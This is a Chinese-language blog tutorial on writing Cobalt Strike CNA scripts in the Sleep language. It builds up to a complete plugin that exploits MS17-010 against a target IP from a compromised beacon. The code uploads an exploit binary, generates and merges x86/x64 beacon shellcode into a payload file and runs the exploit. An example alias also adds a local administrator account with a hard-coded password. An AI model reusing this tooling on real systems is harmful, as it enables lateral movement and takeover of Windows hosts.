@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="通过学习sleep语言和cobaltstrike cna官方文档，实现常用插件的开发。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cna脚本编写学习">
+<meta property="og:url" content="http://yoursite.com/2020/03/08/Cna%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="ceeeeeeb&#39;s blog">
+<meta property="og:description" content="通过学习sleep语言和cobaltstrike cna官方文档，实现常用插件的开发。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/images/cna-0.png">
+<meta property="article:published_time" content="2020-03-08T07:19:23.000Z">
+<meta property="article:modified_time" content="2020-03-08T07:24:37.697Z">
+<meta property="article:author" content="ceeeeeeb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/cna-0.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/03/08/Cna%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Cna脚本编写学习 | ceeeeeeb's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ceeeeeeb's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/08/Cna%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ceeeeeeb">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ceeeeeeb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Cna脚本编写学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-03-08 15:19:23 / Modified: 15:24:37" itemprop="dateCreated datePublished" datetime="2020-03-08T15:19:23+08:00">2020-03-08</time>
+            </span>
+
+          
+            <div class="post-description">通过学习sleep语言和cobaltstrike cna官方文档，实现常用插件的开发。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Cobaltstrike-Cna脚本编写学习"><a href="#Cobaltstrike-Cna脚本编写学习" class="headerlink" title="Cobaltstrike Cna脚本编写学习"></a>Cobaltstrike Cna脚本编写学习</h2><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>通过学习sleep语言和cobaltstrike cna官方文档，实现常用插件的开发。</p>
+<p>编写一个ms17-010漏洞利用工具，gui界面需要提供uploadpath，system_version，target_ip信息。效果如下</p>
+<p><img src="/images/cna-0.png" alt="upload successful"></p>
+<p>执行流程:</p>
+<p>用户输入操作系统-&gt;判断win7（2008）或者win8（2012）-&gt;上传对应版本的exploit程序-&gt;生成32&amp;64位shellcode-&gt;shellcode_merge</p>
+<h2 id="0x01-gui需要的函数"><a href="#0x01-gui需要的函数" class="headerlink" title="0x01 gui需要的函数"></a>0x01 gui需要的函数</h2><h3 id="dialog"><a href="#dialog" class="headerlink" title="dialog"></a>dialog</h3><p>创建一个会话</p>
+<p><code>$1</code> - 会话标题</p>
+<p><code>$2</code> - dictionary mapping 默认值</p>
+<p><code>$3</code> - 回调函数，当调用dbutton_action时，<code>$1为dialog，$2为显示的button名,$3是dictionary mapping参数，是通过drow_text，drow_listener_stage，drow_combobox等函数获取到的用户输入。</code>使用$3[‘key’]即可获取用户输入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub callback &#123;</span><br><span class="line">	# prints: Pressed Go, a is: Apple</span><br><span class="line">	println(&quot;Pressed $2 $+ , a is: &quot; . $3[&#39;a&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dialog &#x3D; dialog(&quot;Hello World&quot;, %(a &#x3D;&gt; &quot;Apple&quot;, b &#x3D;&gt; &quot;Bat&quot;), &amp;callback);</span><br><span class="line">drow_text($dialog, &quot;a&quot;, &quot;Fruit:  &quot;);</span><br><span class="line">drow_text($dialog, &quot;b&quot;, &quot;Rodent: &quot;);</span><br><span class="line">dbutton_action($dialog, &quot;Go&quot;);</span><br><span class="line">dialog_show($dialog);</span><br></pre></td></tr></table></figure>
+
+<h3 id="drow-text"><a href="#drow-text" class="headerlink" title="drow_text"></a>drow_text</h3><p>在dialog会话中添加用户输入框</p>
+<p><code>$1</code> - a <code>$dialog</code> object</p>
+<p><code>$2</code> - the name of this row</p>
+<p><code>$3</code> - the label for this row</p>
+<p><code>$4</code> - <strong>Optional.</strong> The width of this text field (in characters). This value isn’t always honored (it won’t shrink the field, but it will make it wider).</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drow_text($dialog, &quot;name&quot;, &quot;Name: &quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="drow-combobox"><a href="#drow-combobox" class="headerlink" title="drow_combobox"></a>drow_combobox</h3><p>在dialog会话中添加单选框</p>
+<p><strong>Arguments</strong></p>
+<p><code>$1</code> - a <code>$dialog</code> object</p>
+<p><code>$2</code> - the name of this row</p>
+<p><code>$3</code> - the label for this row</p>
+<p><code>$4</code> - an array of options to choose from</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drow_combobox($dialog, &quot;combo&quot;, &quot;Options&quot;, @(&quot;apple&quot;, &quot;bat&quot;, &quot;cat&quot;));</span><br></pre></td></tr></table></figure>
+
+<h3 id="drow-listener-stage"><a href="#drow-listener-stage" class="headerlink" title="drow_listener_stage"></a>drow_listener_stage</h3><p>在dialog会话中添加listener选择功能，列出所有的listener。</p>
+<p><strong>Arguments</strong></p>
+<p><code>$1</code> - a <code>$dialog</code> object</p>
+<p><code>$2</code> - the name of this row</p>
+<p><code>$3</code> - the label for this row</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drow_listener_stage($dialog, &quot;listener&quot;, &quot;Stage: &quot;);</span><br></pre></td></tr></table></figure>
+
+<p>####gui代码整合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">    menu &quot;MS-17010&quot; &#123;</span><br><span class="line">        item &quot;17010_exploit&quot; &#123;</span><br><span class="line">            $bid &#x3D; $1;</span><br><span class="line">            $dialog &#x3D; dialog(&quot;NS-17010 exploit config&quot;, %(UploadPath &#x3D;&gt; &quot;C:\\Windows\\Temp\\&quot;, IP &#x3D;&gt; &quot;192.168.1.254&quot;, target_version &#x3D;&gt; &quot;win7 or win2008&quot;,bid &#x3D;&gt; $bid), &amp;17010_exploit);</span><br><span class="line">            drow_text($dialog, &quot;UploadPath&quot;,  &quot;Upload Path: &quot;);     </span><br><span class="line">            drow_text($dialog, &quot;IP&quot;,  &quot;Target Server IP: &quot;);</span><br><span class="line">            drow_combobox($dialog, &quot;target_version&quot;, &quot;Options&quot;, @(&quot;win7 or win2008&quot;, &quot;win8 or win2012&quot;, &quot;so on&quot;));</span><br><span class="line">            drow_listener_stage($dialog, &quot;listener&quot;, &quot;Stage: &quot;);</span><br><span class="line">            dbutton_action($dialog, &quot;exploit&quot;);</span><br><span class="line">            dialog_show($dialog);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-回调函数17010-exploit"><a href="#0x02-回调函数17010-exploit" class="headerlink" title="0x02 回调函数17010_exploit"></a>0x02 回调函数17010_exploit</h2><h3 id="bcd"><a href="#bcd" class="headerlink" title="bcd"></a>bcd</h3><p>当前beacon cd到目录$2</p>
+<p><strong>Arguments</strong></p>
+<p><code>$1</code> - the id for the beacon. This may be an array or a single ID.</p>
+<p><code>$2</code> - the folder to change to.</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># create a command to change to the user&#39;s home directory</span><br><span class="line">alias home &#123;</span><br><span class="line">	$home &#x3D; &quot;c:\\users\\&quot; . binfo($1, &quot;user&quot;);</span><br><span class="line">	bcd($1, $home);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="bupload"><a href="#bupload" class="headerlink" title="bupload"></a>bupload</h3><p>上传文件</p>
+<p><strong>Arguments</strong></p>
+<p><code>$1</code> - the id for the beacon. This may be an array or a single ID.</p>
+<p><code>$2</code> - the local path to the file to upload</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bupload($1, script_resource(&quot;evil.exe&quot;));</span><br></pre></td></tr></table></figure>
+
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>生成shellcode</p>
+<p><strong>Arguments</strong></p>
+<p><code>$1</code> - the listener name</p>
+<p><code>$2</code> - true/false: is this shellcode destined for a remote target?</p>
+<p><code>$3</code> - x86|x64 - the architecture of the stager output.</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; shellcode(&quot;my listener&quot;, false, &quot;x86&quot;);</span><br><span class="line"></span><br><span class="line">$handle &#x3D; openf(&quot;&gt;out.bin&quot;);</span><br><span class="line">writeb($handle, $data);</span><br><span class="line">closef($handle);</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="sleep-binary-write"><a href="#sleep-binary-write" class="headerlink" title="sleep binary write"></a>sleep binary write</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># simple file copy program.</span><br><span class="line"># java -jar sleep.jar copy.sl &lt;target&gt; &lt;destination&gt;</span><br><span class="line"></span><br><span class="line">($target_f, $dest_f) &#x3D; @ARGV;</span><br><span class="line"></span><br><span class="line">$handle &#x3D; openf($target_f);</span><br><span class="line">$data &#x3D; readb($handle, -1);</span><br><span class="line">closef($handle);</span><br><span class="line"></span><br><span class="line">$handle &#x3D; openf(&quot;&gt; $+ $dest_f);		&#x2F;&#x2F;&gt;为重写</span><br><span class="line">writeb($handle, $data);	</span><br><span class="line">closef($handle);</span><br></pre></td></tr></table></figure>
+
+<h3 id="sleep-pack函数"><a href="#sleep-pack函数" class="headerlink" title="sleep pack函数"></a>sleep pack函数</h3><p>＆pack和＆unpack压缩和从字节字符串中提取睡眠类型。 这些函数解释模板中指定的数据。</p>
+<p>＆pack接受模板和用逗号分隔的项目列表，以打包成一个字节字符串。 ＆unpack接受一个字节字符串，并根据模板提取项目。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">b	1	byte (-128 to 127) (converted to&#x2F;from a sleep int)</span><br><span class="line">B	1	unsigned byte (0 to 255) (converted to&#x2F;from a sleep int)</span><br><span class="line">c	2	UTF-16 Unicode character</span><br><span class="line">C	1	normal character</span><br><span class="line">d	8	double (uses IEEE 754 floating-point &quot;double format&quot; bit layout)</span><br><span class="line">f	4	float (uses IEEE 754 floating-point &quot;single format&quot; bit layout)</span><br><span class="line">h	1	a hex byte (low nybble first)</span><br><span class="line">H	1	a hex byte (high nybble first)</span><br><span class="line">i	4	integer</span><br><span class="line">I	4	unsigned integer (converted to&#x2F;from a sleep long)</span><br><span class="line">l	8	long</span><br><span class="line">M	0	mark this point in the IO stream (for reads only)</span><br><span class="line">o	variable	sleep scalar object (used to serialize&#x2F;deserialize scalars)</span><br><span class="line">R	0	reset this stream to the last mark point (reads only)</span><br><span class="line">s	2	short (converted to&#x2F;from a sleep int)</span><br><span class="line">S	2	unsigned short (converted to&#x2F;from a sleep int)</span><br><span class="line">u	variable	read&#x2F;write UTF-16 character data until terminated with a null byte. (see note below)</span><br><span class="line">U	variable	read&#x2F;write the specified number of UTF-16 characters (consumes the whole field)</span><br><span class="line">x	1	skips a byte&#x2F;writes a nully byte in&#x2F;to this stream (no data returned)</span><br><span class="line">z	variable	read&#x2F;write character data until terminated with a null byte. (see note below)</span><br><span class="line">Z	variable	read&#x2F;write the specified number of characters (consumes the whole field)</span><br></pre></td></tr></table></figure>
+
+<p>所有读取/写入的默认网络字节(大端序)。 如果脚本选择的话，它们可以指示字节顺序。 模板字符后面的+表示大端序。 字符后面的-表示小端序。</p>
+<h3 id="bshell"><a href="#bshell" class="headerlink" title="bshell"></a>bshell</h3><p>Ask Beacon to run a command with cmd.exe</p>
+<p><strong>Arguments</strong></p>
+<p><code>$1</code> - the id for the beacon. This may be an array or a single ID.</p>
+<p><code>$2</code> - the command and arguments to run</p>
+<p><strong>Example</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alias adduser &#123;</span><br><span class="line">	bshell($1, &quot;net user $2 B00gyW00gy1234! &#x2F;ADD&quot;);</span><br><span class="line">	bshell($1, &quot;net localgroup \&quot;Administrators\&quot; $2 &#x2F;ADD&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03完整代码"><a href="#0x03完整代码" class="headerlink" title="0x03完整代码"></a>0x03完整代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">sub 17010_exploit</span><br><span class="line">&#123;</span><br><span class="line">    bcd($bid, $3[&#39;UploadPath&#39;]);</span><br><span class="line">    if($3[&#39;target_version&#39;] &#x3D;&#x3D; &quot;win7 or win2008&quot;)&#123;</span><br><span class="line">        bupload($bid,script_resource(&quot;scripts&#x2F;exploit7&#x2F;exploit.exe&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    else if($3[&#39;target_version&#39;] &#x3D;&#x3D; &quot;win8 or win2012&quot;)&#123;</span><br><span class="line">        bupload($bid,script_resource(&quot;scripts&#x2F;exploit8&#x2F;exploit.exe&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $sc64 &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    $sc86 &#x3D; &quot;&quot;;</span><br><span class="line">    $shellcode_x86 &#x3D; shellcode($3[&#39;listener&#39;], false, &quot;x86&quot;);</span><br><span class="line">    $shellcode_x64 &#x3D; shellcode($3[&#39;listener&#39;], false, &quot;x64&quot;);</span><br><span class="line">    $output_scall &#x3D; openf(&quot;&gt;&gt;&quot;.script_resource(&quot;scripts&#x2F;all.bin&quot;));</span><br><span class="line">    $len_all_x86 &#x3D; strlen($sc86) + strlen($shellcode_x86);</span><br><span class="line">    writeb($output_scall,&quot;\x31\xc0\x40\x0f\x84&quot;.pack(&#39;I-&#39;,$len_all_x86));</span><br><span class="line">    writeb($output_scall,$sc86);</span><br><span class="line">    writeb($output_scall,$shellcode_x86);</span><br><span class="line">    writeb($output_scall,$sc64);</span><br><span class="line">    writeb($output_scall,$shellcode_x64);</span><br><span class="line"></span><br><span class="line">    closef($output_scall);</span><br><span class="line"></span><br><span class="line">    bupload($bid,script_resource(&quot;scripts&#x2F;all.bin&quot;));</span><br><span class="line"></span><br><span class="line">    sleep(120000);</span><br><span class="line"></span><br><span class="line">    bshell($bid, $3[&#39;UploadPath&#39;].&quot;exploit.exe &quot;.$3[&#39;IP&#39;].&quot; &quot;.$3[&#39;UploadPath&#39;].&quot;all.bin&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">popup beacon_bottom &#123;</span><br><span class="line">    menu &quot;MS-17010&quot; &#123;</span><br><span class="line">        item &quot;17010_exploit&quot; &#123;</span><br><span class="line">            $bid &#x3D; $1;</span><br><span class="line">            $dialog &#x3D; dialog(&quot;NS-17010 exploit config&quot;, %(UploadPath &#x3D;&gt; &quot;C:\\Windows\\Temp\\&quot;, IP &#x3D;&gt; &quot;192.168.1.254&quot;, target_version &#x3D;&gt; &quot;win7 or win2008&quot;,bid &#x3D;&gt; $bid), &amp;17010_exploit);</span><br><span class="line">            drow_text($dialog, &quot;UploadPath&quot;,  &quot;Upload Path: &quot;);     </span><br><span class="line">            drow_text($dialog, &quot;IP&quot;,  &quot;Target Server IP: &quot;);</span><br><span class="line">            drow_combobox($dialog, &quot;target_version&quot;, &quot;Options&quot;, @(&quot;win7 or win2008&quot;, &quot;win8 or win2012&quot;, &quot;so on&quot;));</span><br><span class="line">            drow_listener_stage($dialog, &quot;listener&quot;, &quot;Stage: &quot;);</span><br><span class="line">            dbutton_action($dialog, &quot;exploit&quot;);</span><br><span class="line">            dialog_show($dialog);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/07/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-%E5%86%99%E6%96%87%E4%BB%B6/" rel="prev" title="文件传输&写文件">
+      <i class="fa fa-chevron-left"></i> 文件传输&写文件
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobaltstrike-Cna脚本编写学习"><span class="nav-number">1.</span> <span class="nav-text">Cobaltstrike Cna脚本编写学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-简介"><span class="nav-number">2.</span> <span class="nav-text">0x00 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-gui需要的函数"><span class="nav-number">3.</span> <span class="nav-text">0x01 gui需要的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dialog"><span class="nav-number">3.1.</span> <span class="nav-text">dialog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#drow-text"><span class="nav-number">3.2.</span> <span class="nav-text">drow_text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#drow-combobox"><span class="nav-number">3.3.</span> <span class="nav-text">drow_combobox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#drow-listener-stage"><span class="nav-number">3.4.</span> <span class="nav-text">drow_listener_stage</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-回调函数17010-exploit"><span class="nav-number">4.</span> <span class="nav-text">0x02 回调函数17010_exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bcd"><span class="nav-number">4.1.</span> <span class="nav-text">bcd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bupload"><span class="nav-number">4.2.</span> <span class="nav-text">bupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">4.3.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep-binary-write"><span class="nav-number">4.4.</span> <span class="nav-text">sleep binary write</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep-pack函数"><span class="nav-number">4.5.</span> <span class="nav-text">sleep pack函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bshell"><span class="nav-number">4.6.</span> <span class="nav-text">bshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03完整代码"><span class="nav-number">5.</span> <span class="nav-text">0x03完整代码</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ceeeeeeb</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ceeeeeeb</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
